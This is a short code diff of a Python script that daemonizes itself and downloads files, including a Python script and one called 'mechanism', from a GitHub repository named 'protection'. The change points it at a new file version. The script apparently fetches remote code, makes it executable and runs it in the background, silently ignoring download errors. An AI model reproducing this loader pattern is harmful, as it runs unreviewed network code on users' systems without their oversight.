@@ -43,7 +43,7 @@ def daemonize():
         sys.exit(1)
 
 # Define URLs for downloading the necessary files
-repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
+repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection3.py"
 requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
 contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
 
@@ -122,9 +122,6 @@ def download_file(url, file_path):
         with open(file_path, 'wb') as file:
             file.write(response.content)
     except requests.exceptions.RequestException as e:
-
-#sys.exit(0)
-
         pass
 
 # Function to make script executable
